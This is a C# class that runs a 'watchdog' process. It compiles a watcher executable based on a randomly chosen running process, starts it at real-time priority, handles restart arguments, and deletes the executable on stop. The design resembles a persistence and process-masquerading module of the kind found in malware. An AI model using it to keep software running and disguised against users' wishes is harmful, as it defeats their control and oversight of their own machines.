using System;
using System.IO;
using System.Threading;
using System.Diagnostics;

namespace Application.Watcher
{
    internal sealed class Watchdog : IDisposable
    {
        public Process WathdogProcess;
        private static readonly string exe = ProcessUtils.CurrentProcess.ProcessName + ".exe";
        public static readonly string commandLineArgs = string.Join(" ", Environment.GetCommandLineArgs())
                                                                        .Replace(Path.GetFullPath(exe), "")
                                                                        .Replace(exe, "");
        public readonly bool IsRestarted = commandLineArgs.Contains("--restarted");

        /// <summary>
        /// Initialize
        /// </summary>
        public Watchdog()
        {
            if (this.IsRestarted == true) // Find current parent process (watchdog)
                this.WathdogProcess = ProcessUtils.GetParent(ProcessUtils.CurrentProcess);
        }

        /// <summary>
        /// Dispose
        /// </summary>
        public void Dispose()
        {
            this.StopWatcher();
            GC.Collect();
        }

        /// <summary>
        /// Start watchdog service
        /// </summary>
        /// <returns>Status</returns>
        public bool StartWatcher()
        {
            // Grab random process
            Process random_process = ProcessUtils.GrabRandomProcess();
            if (random_process == null) 
                return false;
            // Compile watchdog executable
            string exe = Compiler.CompileWatcher(random_process);
            if (string.IsNullOrEmpty(exe))
                return false;
            // Start watchdog in new thread
            Thread t = new Thread(() => 
                this.WathdogProcess = Process.Start(exe));
            t.IsBackground = true;
            t.Start();
            // Wait for process start
            while (this.WathdogProcess == null && t.IsAlive)
                Thread.Sleep(100);
            // Change process priority
            this.WathdogProcess.PriorityClass = ProcessPriorityClass.RealTime;
            return true;
        }

        /// <summary>
        /// Stop watchdog service
        /// </summary>
        /// <returns>Status</returns>
        public bool StopWatcher()
        {
            try
            {
                if (this.WathdogProcess.HasExited == false)
                {
                    string exe = ProcessUtils.ProcessExecutablePath(this.WathdogProcess);
                    this.WathdogProcess.Kill(); // Kill watchdog process
                    // Delete watchdog executable
                    if (File.Exists(exe)) File.Delete(exe);
                }
            } catch (Exception) { return false; }
            return true;
        }

    }
}
